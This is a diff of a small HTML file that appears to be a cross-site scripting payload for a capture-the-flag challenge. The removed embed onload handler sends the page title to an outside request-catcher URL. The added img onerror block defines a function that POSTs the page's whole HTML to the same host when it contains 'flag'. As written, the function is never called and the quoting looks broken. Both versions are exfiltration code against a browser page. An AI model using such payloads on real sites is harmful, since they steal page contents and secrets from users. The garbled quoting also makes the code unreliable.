@@ -1,10 +1,18 @@
 <html>
  <body>
-   <embed onload="let flag = this.document.title;
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://alexyqiu.free.beeceptor.com', true);
-      xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
-      xhr.send(JSON.stringify(flag));">
- </embed>
+   	<script>this.document.title = "a"; this.document.title = "
+	<img src="a" onerror="
+	function sendContent() {
+				var flag = "flag";
+				var content = document.documentElement.innerHTML;
+				if (content.indexOf(flag) !== -1) {
+					var xhttp = new XMLHttpRequest();
+					xhttp.open("POST", "https://alexyqiu.free.beeceptor.com", true);
+					xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+					xhttp.send("content=" + content);
+				}
+			}
+	">
+	"</script>
 </body>
 </html>
